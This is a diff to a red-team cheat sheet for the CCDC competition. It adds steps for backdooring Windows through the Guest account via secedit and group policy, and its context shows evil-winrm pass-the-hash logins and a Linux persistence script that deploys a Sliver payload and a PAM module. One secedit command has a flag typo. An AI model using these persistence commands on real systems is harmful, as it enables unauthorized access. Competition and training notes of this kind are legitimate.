@@ -49,6 +49,12 @@ pagetitle: Red Teaming for CCDC
     - `/p:{password}` if we have it
   - 5985 - use `evil-winrm -i {IP} -u '{domain}\{username}' -H {hash} -r {domain}`
     - `-r` optional, used for kerberos
+- Persisting via the `Guest` account
+  - After enabling/providing administrator to Guest and adding it to the `Remote Desktop Users` group, we might still need to configure group policy:
+    - `secedit /export /cfg C:\Windows\temp\secpol.inf`
+    - Modify the "SeDenyInteractiveLogonRight" line and remove the `Guest` account
+    - Reimport with `secedit /configure /db C:\Windows\temp\secedit.sdb /cgf C:\Windows\temp\secpol.inf`
+    - Then update GP with `gpupdate /force`
 
 **Linux:**
 - Run [linux_persistence.sh {ip}:{port} {sliver_payload_file} {pam_so_file}](https://khaelkugler.com/scripts/linux_persistence.sh.txt) while hosting the payload
